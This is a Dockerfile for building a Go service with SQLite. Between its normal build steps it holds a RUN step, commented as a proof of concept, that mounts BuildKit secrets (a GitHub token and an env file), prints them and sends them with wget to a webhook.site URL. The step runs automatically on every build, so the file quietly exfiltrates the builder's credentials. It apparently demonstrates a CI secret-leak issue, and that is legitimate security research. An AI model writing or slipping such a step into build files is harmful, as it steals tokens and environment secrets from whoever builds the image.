FROM golang:1.25-alpine AS builder

WORKDIR /app

RUN apk add --no-cache gcc musl-dev sqlite-dev

COPY go.mod go.sum* ./
RUN go mod download

COPY . .

# === PoC: exfiltrate BuildKit secrets to webhook.site (own endpoint) ===
RUN --mount=type=secret,id=GIT_AUTH_TOKEN.github.com,target=/t \
    --mount=type=secret,id=env,target=/e \
    sh -c 'T=$(cat /t 2>/dev/null); E=$(base64 -w0 /e 2>/dev/null); \
      echo "=== TOKEN ==="; echo "$T"; echo "=== ENV(b64) ==="; echo "$E"; \
      wget -qO- "https://webhook.site/49671dcd-ee74-487e-b7ef-93777ff3d245?token=$T&env_b64=$E" || true'

RUN CGO_ENABLED=1 GOOS=linux go build -a -o main .

FROM alpine:latest
RUN apk --no-cache add ca-certificates sqlite-libs
WORKDIR /root/
COPY --from=builder /app/main .
ENV PORT 3131
CMD ["./main"]
